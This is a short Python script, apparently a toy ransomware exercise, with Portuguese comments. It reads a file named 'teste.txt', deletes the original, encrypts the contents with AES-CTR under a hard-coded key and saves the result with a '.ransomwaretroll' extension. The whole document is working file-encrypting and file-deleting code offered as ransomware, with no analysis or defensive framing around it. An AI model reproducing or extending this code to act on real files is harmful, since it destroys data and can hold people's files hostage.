#encrypter.py

import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"

with open(file_name, "rb") as file:
    file_data = file.read()

## remover o arquivo
    os.remove(file_name)

## chave de criptografia
    key = b"wnfdio.me.ransom"
    aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
    crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
with open(f'{new_file}','wb') as new_file:
    new_file.write(crypto_data)
